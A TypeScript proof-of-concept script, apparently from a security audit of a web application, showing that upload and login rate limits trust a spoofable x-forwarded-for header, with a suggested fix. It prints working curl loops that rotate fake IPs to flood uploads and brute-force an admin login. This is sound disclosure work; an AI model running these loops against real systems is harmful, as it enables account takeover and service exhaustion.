/**
 * PoC 6: IP-SPOOFABLE RATE LIMITS — x-forwarded-for Trusted Without Validation
 * Severity: MEDIUM
 * 
 * Finding: In multiple API routes, the IP address is extracted from the
 * x-forwarded-for header without validation. An attacker can bypass
 * IP-based rate limits by spoofing this header.
 * 
 * Affected locations:
 *   - src/app/api/upload/route.ts (line 21)
 *   - src/lib/auth.ts (line 22-23)
 * 
 * Run: npx tsx .tmp-poc/poc6-ip-spoof-rate-limit.ts
 */

function poc() {
  console.log('=== PoC 6: IP-Spoofable Rate Limits ===\n');

  // Show the vulnerable code patterns
  console.log('--- Vulnerable Code Patterns ---\n');

  console.log('1. Upload rate limiting (src/app/api/upload/route.ts:21):');
  console.log('   const ip = req.headers.get(\'x-forwarded-for\')?.split(\',\')[0]?.trim() || \'unknown\';');
  console.log('   const uploadKey = `upload:ip:${ip}`;\n');

  console.log('2. Login rate limiting (src/lib/auth.ts:22-23):');
  console.log('   const forwardedFor = req?.headers?.get?.(\'x-forwarded-for\');');
  console.log('   const ip = forwardedFor?.split(\',\')[0]?.trim() || req?.headers?.get?.(\'x-real-ip\') || \'unknown\';\n');

  console.log('--- Attack Scenario ---\n');
  console.log('Upload rate limit: 10 requests per minute per IP');
  console.log('Login rate limit: 20 attempts per 15 minutes per IP\n');

  console.log('Step 1: Attacker sends upload with x-forwarded-for: 1.1.1.1');
  console.log('  → Rate limit key: upload:ip:1.1.1.1');
  console.log('  → Counts toward limit for 1.1.1.1\n');

  console.log('Step 2: After 10 requests, switch to x-forwarded-for: 1.1.1.2');
  console.log('  → Rate limit key: upload:ip:1.1.1.2');
  console.log('  → Fresh limit! 10 more requests\n');

  console.log('Step 3: Repeat with 1.1.1.3, 1.1.1.4, etc.');
  console.log('  → Unlimited uploads (memory exhaustion)\n');

  console.log('--- curl PoC (for testing, NOT production) ---\n');
  console.log('  for i in $(seq 1 50); do');
  console.log('    curl -s -o /dev/null -w "%{http_code}" \\');
  console.log('      -X POST http://localhost:3000/api/upload \\');
  console.log('      -H "Cookie: authjs.session-token=<TOKEN>" \\');
  console.log('      -H "x-forwarded-for: 10.0.0.$((i % 10))" \\');
  console.log('      -F "file=@test.pdf;type=application/pdf" \\');
  console.log('      -F "name=Test" -F "posisi=Dev" -F "kriteria=test" -F "prompt=test"');
  console.log('    echo " req=$i"');
  console.log('  done');
  console.log('  # Expected: All 50 requests succeed (rate limit bypassed by IP rotation)\n');

  console.log('--- Login brute-force bypass ---\n');
  console.log('  for i in $(seq 1 100); do');
  console.log('    curl -s -X POST http://localhost:3000/api/auth/callback/credentials \\');
  console.log('      -H "x-forwarded-for: 10.0.0.$((i % 20))" \\');
  console.log('      -d "email=admin@superhrd.com&password=pass$i"');
  console.log('  done');
  console.log('  # 100 login attempts across 20 IPs = 5 per IP (under limit)\n');

  console.log('--- Impact ---');
  console.log('• Bypass upload rate limit → unlimited file uploads → disk/memory exhaustion');
  console.log('• Bypass login rate limit → unlimited brute-force attempts');
  console.log('• Bypass topup rate limit → unlimited topup requests (spam admin)\n');

  console.log('--- Fix ---');
  console.log('If behind a trusted reverse proxy:');
  console.log('  - Validate that x-forwarded-for contains only trusted proxy IPs');
  console.log('  - Use a whitelist of proxy IPs');
  console.log('  - Or use x-real-ip from the proxy only\n');
  console.log('If not behind a proxy:');
  console.log('  - Do NOT trust x-forwarded-for at all');
  console.log('  - Use req.socket.remoteAddress (but this is 127.0.0.1 behind proxy)');
  console.log('  - Implement rate limiting at the reverse proxy level (nginx, Cloudflare)');
}

poc();
